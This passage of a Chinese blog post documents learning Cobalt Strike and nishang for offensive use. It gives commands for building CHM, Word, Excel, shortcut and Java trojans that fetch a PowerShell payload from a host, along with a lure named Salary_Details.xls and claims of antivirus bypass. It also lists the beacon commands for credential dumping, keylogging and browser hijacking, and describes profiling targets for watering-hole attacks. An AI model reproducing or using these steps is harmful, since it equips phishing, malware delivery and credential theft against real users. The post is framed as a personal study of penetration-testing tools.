+<p>提示已上线，通过这种办法制作的chm木马可以绕过大多数杀软，包括360等，但是实战的时候发现会被电脑管家发现。</p>
+<p><img src="http://i.imgur.com/qC6vash.jpg" alt=""></p>
+<p>这里我们所执行的chm文件通过rundll32.exe文件来执行PowerShell。</p>
+<p>这里我还思路着另外一个问题，当chm文档被执行时，木马会上线，但是如果目标把这个文件删掉，我们的木马将也会被删除。这里会想，当打开一个chm文档的时候，自动把木迁移到其它进程上。</p>
+<p>Tools Links:<br><a href="https://github.com/hackzx/OutCHM" target="_blank" rel="external">https://github.com/hackzx/OutCHM</a><br><a href="https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1" target="_blank" rel="external">https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1</a></p>
+<h6 id="制作Word木马"><a href="#制作Word木马" class="headerlink" title="制作Word木马"></a>制作Word木马</h6><p>其实和<code>Attacks -&gt; MS Office Macro</code>方法类似</p>
+<p><code>PS C:\Users\Administrator\Desktop\nishang&gt; Import-Module .\Client\Out-Word.ps1</code><br>Out-Word使用方法查看源文件第3-108行使用方法。</p>
+<p><code>Out-Word -Payload &#39;加密代码&#39;</code><br><img src="http://i.imgur.com/0rfYg7g.jpg" alt=""></p>
+<p>以及</p>
+<p><code>Out-Word -PayloadURL http://192.168.4.102:89/download/payload.ps1</code></p>
+<p><img src="http://i.imgur.com/gJrwxzb.jpg" alt=""></p>
+<p>其实这两种专景都各有用处，比如我在某台机器里不允许访问网络可以使用第一种方法，PowerShell有各种各样的内网渗透脚本，这里不多介绍。</p>
+<p>正常上线。<br><img src="http://i.imgur.com/wOP39rq.jpg" alt=""></p>
+<p>打开直接中招。可能是之前实例打开过启用宏。这个没有提示宏，也没有报其它错误。<br>但具体的日后还需要实战才能下定论。</p>
+<h6 id="制作Excel木马"><a href="#制作Excel木马" class="headerlink" title="制作Excel木马"></a>制作Excel木马</h6><p>用法：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\nishang&gt; Import-Module .\Client\Out-Excel.ps1</span><br><span class="line">PS C:\Users\Administrator\Desktop\nishang&gt; Out-Excel -PayloadURL http://<span class="number">192.168</span>.<span class="number">4.102</span>:<span class="number">89</span>/download/payload.ps1</span><br><span class="line">Saved to file C:\Users\Administrator\Desktop\nishang\Salary_Details.xls</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></p>
+<h6 id="制作快捷方式钓鱼文件"><a href="#制作快捷方式钓鱼文件" class="headerlink" title="制作快捷方式钓鱼文件"></a>制作快捷方式钓鱼文件</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\nishang&gt; Import-Module .\Client\Out-Shortcut.ps1</span><br><span class="line">PS C:\Users\Administrator\Desktop\nishang&gt; Out-Shortcut -PayloadURL http://<span class="number">192.168</span>.<span class="number">4.102</span>:<span class="number">89</span>/download/payload.ps1</span><br><span class="line">The Shortcut file has been written as C:\Users\Administrator\Desktop\nishang\Shortcut to File Server.lnk</span><br></pre></td></tr></table></figure>
+<p><img src="http://i.imgur.com/t92R0ky.jpg" alt=""></p>
+<p>正常运行：<br><img src="http://i.imgur.com/XbbvOge.jpg" alt=""></p>
+<h6 id="OUT-JAV"><a href="#OUT-JAV" class="headerlink" title="OUT-JAV"></a>OUT-JAV</h6><p><img src="http://i.imgur.com/kFUpsVc.jpg" alt=""></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\nishang&gt; Out-Java -PayloadURL http://<span class="number">192.168</span>.<span class="number">4.102</span>:<span class="number">89</span>/download/payload.ps1 -JDKPath <span class="string">"C</span><br><span class="line">:\Program Files\Java\jdk1.8.0_31"</span></span><br><span class="line">added manifest</span><br><span class="line">adding: JavaPS.class(<span class="keyword">in</span> = <span class="number">1176</span>) (out= <span class="number">697</span>)(deflated <span class="number">40</span>%)</span><br><span class="line">jar signed.</span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">The signer certificate will expire within six months.</span><br><span class="line">No -tsa or -tsacert is provided and this jar is not timestamped. Without a timestamp, users may not be able to validate</span><br><span class="line">this jar after the signer certificate<span class="string">'s expiration date (2017-07-01) or after any future revocation date.</span></span><br></pre></td></tr></table></figure>
+<p>对这个不看好。毕竟很多人电脑都没有装jdk</p>
+<p>还有其它如果有遇到的场景我会继续更新：<br><img src="http://i.imgur.com/ZXJWsSj.jpg" alt=""></p>
+<h5 id="Signed-Applet-Attack"><a href="#Signed-Applet-Attack" class="headerlink" title="Signed Applet Attack"></a>Signed Applet Attack</h5><p>java攻击，需要jdk1.6</p>
+<h5 id="Smart-Applet-Attack"><a href="#Smart-Applet-Attack" class="headerlink" title="Smart Applet Attack"></a>Smart Applet Attack</h5><p>java攻击，jdk1.7以及1.6都会受到攻击</p>
+<h5 id="System-Profiler"><a href="#System-Profiler" class="headerlink" title="System Profiler"></a>System Profiler</h5><p>分析目标使用什么浏览器以及Adobe版本，还有内部ip。</p>
+<p><img src="http://i.imgur.com/8i2uglW.jpg" alt=""></p>
+<p>当目标访问的时候会跳转到百度，所以不会被杀软发现。<br><img src="http://i.imgur.com/LnnPkKV.jpg" alt=""></p>
+<p>这里收集信息是为了后期apt攻击用<br><img src="http://i.imgur.com/4J9MySf.jpg" alt=""></p>
+<p><img src="http://i.imgur.com/niqYV5Z.jpg" alt=""></p>
+<p>这里可以前期信息收集所用，因为这种方法杀软以及浏览器是无法检测出来的，可以通过<code>水坑式攻击</code>来获取目标所用的软件以及操作系统来针对性的攻击。</p>
+<h3 id="Beacon-Management"><a href="#Beacon-Management" class="headerlink" title="Beacon Management"></a>Beacon Management</h3><p>Beacon可以选择通过DNS还是HTTP协议出口网络，支持多主机连接。<br><img src="http://i.imgur.com/M0MSvn1.jpg" alt=""></p>
+<h4 id="Intercat"><a href="#Intercat" class="headerlink" title="Intercat"></a>Intercat</h4><p><img src="http://i.imgur.com/i1sqEWB.jpg" alt=""></p>
+<p>进入到控制台<br>在beacon处输入help，则可以看到详细说明：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">Command                   Description</span><br><span class="line">-------                   -----------</span><br><span class="line">browserpivot              Setup a browser pivot session</span><br><span class="line">bypassuac                 Spawn a session in a high integrity process</span><br><span class="line">cancel                    Cancel a download that&apos;s in-progress</span><br><span class="line">cd                        Change directory</span><br><span class="line">checkin                   Call home and post data</span><br><span class="line">clear                     Clear beacon queue</span><br><span class="line">covertvpn                 Deploy Covert VPN client</span><br><span class="line">dcsync                    Extract a password hash from a DC</span><br><span class="line">desktop                   View and interact with target&apos;s desktop</span><br><span class="line">dllinject                 Inject a Reflective DLL into a process</span><br><span class="line">download                  Download a file</span><br><span class="line">downloads                 Lists file downloads in progress</span><br><span class="line">drives                    List drives on target</span><br><span class="line">elevate                   Try to elevate privileges</span><br><span class="line">execute                   Execute a program on target</span><br><span class="line">exit                      Terminate the beacon session</span><br><span class="line">getsystem                 Attempt to get SYSTEM</span><br><span class="line">getuid                    Get User ID</span><br><span class="line">hashdump                  Dump password hashes</span><br><span class="line">help                      Help menu</span><br><span class="line">inject                    Spawn a session in a specific process</span><br><span class="line">jobkill                   Kill a long-running post-exploitation task</span><br><span class="line">jobs                      List long-running post-exploitation tasks</span><br><span class="line">kerberos_ccache_use       Apply kerberos ticket from cache to this session</span><br><span class="line">kerberos_ticket_purge     Purge kerberos tickets from this session</span><br><span class="line">kerberos_ticket_use       Apply kerberos ticket to this session</span><br><span class="line">keylogger                 Inject a keystroke logger into a process</span><br><span class="line">kill                      Kill a process</span><br><span class="line">link                      Connect to a Beacon peer over SMB</span><br><span class="line">logonpasswords            Dump credentials and hashes with mimikatz</span><br><span class="line">ls                        List files</span><br><span class="line">make_token                Create a token to pass credentials</span><br><span class="line">mimikatz                  Runs a mimikatz command</span><br><span class="line">mkdir                     Make a directory</span><br><span class="line">mode dns                  Use DNS A as data channel (DNS beacon only)</span><br><span class="line">mode dns-txt              Use DNS TXT as data channel (DNS beacon only)</span><br><span class="line">mode dns6                 Use DNS AAAA as data channel (DNS beacon only)</span><br><span class="line">mode http                 Use HTTP as data channel</span><br><span class="line">mode smb                  Use SMB peer-to-peer communication</span><br><span class="line">net                       Network and host enumeration tool</span><br><span class="line">note                      Assign a note to this Beacon       </span><br><span class="line">portscan                  Scan a network for open services</span><br><span class="line">powerpick                 Execute a command via Unmanaged PowerShell</span><br><span class="line">powershell                Execute a command via powershell.exe</span><br><span class="line">powershell-import         Import a powershell script</span><br><span class="line">ps                        Show process list</span><br><span class="line">psexec                    Use a service to spawn a session on a host</span><br><span class="line">psexec_psh                Use PowerShell to spawn a session on a host</span><br><span class="line">psinject                  Execute PowerShell command in specific process</span><br><span class="line">pth                       Pass-the-hash using Mimikatz</span><br><span class="line">pwd                       Print current directory</span><br><span class="line">rev2self                  Revert to original token</span><br><span class="line">rm                        Remove a file or folder</span><br><span class="line">rportfwd                  Setup a reverse port forward</span><br><span class="line">runas                     Execute a program as another user</span><br><span class="line">screenshot                Take a screenshot</span><br><span class="line">shell                     Execute a command via cmd.exe</span><br><span class="line">shinject                  Inject shellcode into a process</span><br><span class="line">sleep                     Set beacon sleep time</span><br><span class="line">socks                     Start SOCKS4a server to relay traffic</span><br><span class="line">socks stop                Stop SOCKS4a server</span><br><span class="line">spawn                     Spawn a session </span><br><span class="line">spawnas                   Spawn a session as another user</span><br><span class="line">spawnto                   Set executable to spawn processes into</span><br><span class="line">steal_token               Steal access token from a process</span><br><span class="line">timestomp                 Apply timestamps from one file to another</span><br><span class="line">unlink                    Disconnect from parent Beacon</span><br><span class="line">upload                    Upload a file</span><br><span class="line">wdigest                   Dump plaintext credentials with mimikatz</span><br><span class="line">winrm                     Use WinRM to spawn a session on a host</span><br><span class="line">wmi                       Use WMI to spawn a session on a host</span><br></pre></td></tr></table></figure>
+<p>可以快速通过命令来操作，其实大多数都是通过图形化操作。</p>
+<h4 id="Access"><a href="#Access" class="headerlink" title="Access"></a>Access</h4><h5 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h5><p>获取hash值，可以通过<code>http://www.objectif-securite.ch/ophcrack.php</code>破解。<br><img src="http://i.imgur.com/GcaFAVa.jpg" alt=""></p>
+<p>这种方法只能针对于Windows2003实用，其Win2008开始读取到的hash值也是为空</p>
+<h5 id="Make-Token"><a href="#Make-Token" class="headerlink" title="Make Token"></a>Make Token</h5><p>获取到的hash用户密码都会在此显示<br><img src="http://i.imgur.com/qj1nzgu.jpg" alt=""></p>
+<h5 id="Run-mimikatz"><a href="#Run-mimikatz" class="headerlink" title="Run mimikatz"></a>Run mimikatz</h5><p>Mimikatz是一个法国获取密码工具，能直接获取到明文密码。其实获取密码只是他其中的一个功能。<br><img src="http://i.imgur.com/IeHdOai.jpg" alt=""></p>
+<h4 id="Explore"><a href="#Explore" class="headerlink" title="Explore"></a>Explore</h4><h5 id="browserpivot"><a href="#browserpivot" class="headerlink" title="browserpivot"></a>browserpivot</h5><p>用户注入受害者浏览器进程，然后开启HTTP代理，之后就可以登录受害者登录的网站了。</p>
+<p><code>主机 -&gt; Access -&gt; Proces list</code><br><img src="http://i.imgur.com/MbxSzVv.jpg" alt=""></p>
+<p>或直接输入<code>browserpivot 进程号</code><br><img src="http://i.imgur.com/m7gbUte.jpg" alt=""></p>
+<p>浏览器设置：<br><code>192.168.1.117:35380</code><br><img src="http://i.imgur.com/zAyCadX.jpg" alt=""></p>
+<p>截取浏览器进程屏幕<br><img src="http://i.imgur.com/vJWsplX.jpg" alt=""></p>
+<p><code>View -&gt; Screenshot</code><br><img src="http://i.imgur.com/XWToLw1.jpg" alt=""></p>
+<p>键盘记录<br><img src="http://i.imgur.com/mYKx0R6.jpg" alt=""></p>
+<h4 id="Pivoting"><a href="#Pivoting" class="headerlink" title="Pivoting"></a>Pivoting</h4><p>开启socks代理<br><img src="http://i.imgur.com/Dyx2vID.jpg" alt=""></p>
+<p> <code>vim /etc/proxychains.conf</code><br><img src="http://i.imgur.com/nVk4ZO9.jpg" alt=""></p>
+<p><code>Proxychanins firefox</code>，这样可以通过firefox访问内网网站</p>
+<h4 id="Spawn"><a href="#Spawn" class="headerlink" title="Spawn"></a>Spawn</h4><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>总结：<br>还有些没写的，只是暂时还没用到这功能，只有在实战中才能体会吧。</p>
+<p>参考：<br><a href="https://evi1cg.me/archives/Powershell_client.html" target="_blank" rel="external">https://evi1cg.me/archives/Powershell_client.html</a><br><a href="http://www.labofapenetrationtester.com/2014_11_01_archive.html" target="_blank" rel="external">http://www.labofapenetrationtester.com/2014_11_01_archive.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/news-15974.3html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/news-15974.3html</a><br><a href="http://wooyun.jozxing.cc/static/drops/papers-12315.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-12315.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/papers-6332.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/papers-6332.html</a><br><a href="http://wooyun.jozxing.cc/static/drops/tools-1475.html" target="_blank" rel="external">http://wooyun.jozxing.cc/static/drops/tools-1475.html</a><br><a href="https://github.com/rsmudge/cortana-scripts" target="_blank" rel="external">https://github.com/rsmudge/cortana-scripts</a><br><a href="https://evi1cg.me/archives/Cobalt_strike.html" target="_blank" rel="external">https://evi1cg.me/archives/Cobalt_strike.html</a><br><a href="https://evi1cg.me/archives/chm_backdoor.html" target="_blank" rel="external">https://evi1cg.me/archives/chm_backdoor.html</a><br><a href="http://bobao.360.cn/learning/detail/164.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/164.html</a><br><a href="http://support.microsoft.com/kb/164787/" target="_blank" rel="external">http://support.microsoft.com/kb/164787/</a><br><a href="http://www.freebuf.com/articles/system/119874.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/119874.html</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/03/25/一星期实战总结（四）/" rel="next" title="一星期实战总结（四）">
+                <i class="fa fa-chevron-left"></i> 一星期实战总结（四）
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/04/17/一星期实战总结（五）/" rel="prev" title="一星期实战总结（五）">
+                一星期实战总结（五） <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/04/09/Cobalt-Strike学习（持续）/"
+           data-title="Cobalt Strike学习（持续）" data-url="http://yoursite.com/2017/04/09/Cobalt-Strike学习（持续）/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="EvilAnne" />
+          <p class="site-author-name" itemprop="name">EvilAnne</p>
+          <p class="site-description motion-element" itemprop="description">比天赋更重要的是变强起来的勇气</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">128</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">2.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Tools-Link"><span class="nav-number">2.1.</span> <span class="nav-text">Tools Link</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#基本操作"><span class="nav-number">2.2.</span> <span class="nav-text">基本操作</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Team-Server-Setup"><span class="nav-number">2.2.1.</span> <span class="nav-text">Team Server Setup</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#功能了解"><span class="nav-number">2.3.</span> <span class="nav-text">功能了解</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Cobalt-Strike"><span class="nav-number">2.3.1.</span> <span class="nav-text">Cobalt Strike</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Preferences"><span class="nav-number">2.3.1.1.</span> <span class="nav-text">Preferences</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Visualization"><span class="nav-number">2.3.1.2.</span> <span class="nav-text">Visualization</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Listenrs"><span class="nav-number">2.3.1.3.</span> <span class="nav-text">Listenrs</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#View"><span class="nav-number">2.4.</span> <span class="nav-text">View</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Client-side-Attacks"><span class="nav-number">2.5.</span> <span class="nav-text">Client-side Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Packages"><span class="nav-number">2.5.1.</span> <span class="nav-text">Packages</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#HTML-Application"><span class="nav-number">2.5.1.1.</span> <span class="nav-text">HTML Application</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#MS-Office-Macro"><span class="nav-number">2.5.1.2.</span> <span class="nav-text">MS Office Macro</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Payload-Generator"><span class="nav-number">2.5.1.3.</span> <span class="nav-text">Payload Generator</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#USB-CD-AutoPlay"><span class="nav-number">2.5.1.4.</span> <span class="nav-text">USB/CD AutoPlay</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-Dropper"><span class="nav-number">2.5.1.5.</span> <span class="nav-text">Windows Dropper</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-Executable"><span class="nav-number">2.5.1.6.</span> <span class="nav-text">Windows Executable</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Windows-Executable-s"><span class="nav-number">2.5.1.7.</span> <span class="nav-text">Windows Executable(s)</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web-Drive-by"><span class="nav-number">2.5.2.</span> <span class="nav-text">Web Drive-by</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Manage"><span class="nav-number">2.5.2.1.</span> <span class="nav-text">Manage</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Clone-Site"><span class="nav-number">2.5.2.2.</span> <span class="nav-text">Clone Site</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Host-File"><span class="nav-number">2.5.2.3.</span> <span class="nav-text">Host File</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Scripted-Web-Delivery"><span class="nav-number">2.5.2.4.</span> <span class="nav-text">Scripted Web Delivery</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#制作CHM木马"><span class="nav-number">2.5.2.4.1.</span> <span class="nav-text">制作CHM木马</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#制作Word木马"><span class="nav-number">2.5.2.4.2.</span> <span class="nav-text">制作Word木马</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#制作Excel木马"><span class="nav-number">2.5.2.4.3.</span> <span class="nav-text">制作Excel木马</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#制作快捷方式钓鱼文件"><span class="nav-number">2.5.2.4.4.</span> <span class="nav-text">制作快捷方式钓鱼文件</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#OUT-JAV"><span class="nav-number">2.5.2.4.5.</span> <span class="nav-text">OUT-JAV</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Signed-Applet-Attack"><span class="nav-number">2.5.2.5.</span> <span class="nav-text">Signed Applet Attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Smart-Applet-Attack"><span class="nav-number">2.5.2.6.</span> <span class="nav-text">Smart Applet Attack</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#System-Profiler"><span class="nav-number">2.5.2.7.</span> <span class="nav-text">System Profiler</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Beacon-Management"><span class="nav-number">2.6.</span> <span class="nav-text">Beacon Management</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Intercat"><span class="nav-number">2.6.1.</span> <span class="nav-text">Intercat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Access"><span class="nav-number">2.6.2.</span> <span class="nav-text">Access</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#hashdump"><span class="nav-number">2.6.2.1.</span> <span class="nav-text">hashdump</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Make-Token"><span class="nav-number">2.6.2.2.</span> <span class="nav-text">Make Token</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Run-mimikatz"><span class="nav-number">2.6.2.3.</span> <span class="nav-text">Run mimikatz</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Explore"><span class="nav-number">2.6.3.</span> <span class="nav-text">Explore</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#browserpivot"><span class="nav-number">2.6.3.1.</span> <span class="nav-text">browserpivot</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pivoting"><span class="nav-number">2.6.4.</span> <span class="nav-text">Pivoting</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Spawn"><span class="nav-number">2.6.5.</span> <span class="nav-text">Spawn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Session"><span class="nav-number">2.6.6.</span> <span class="nav-text">Session</span></a></li></ol></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EvilAnne</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+  <span id="busuanzi_container_site_pv">访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"http://evilanne.duoshuo.com"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+      
+      <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+      <script src="/js/src/hook-duoshuo.js"></script>
+    
+  
+
+
+
+
+
+  
+  
+  
+
+  
+
+  
+ 
+  
+
+</body>
+</html>
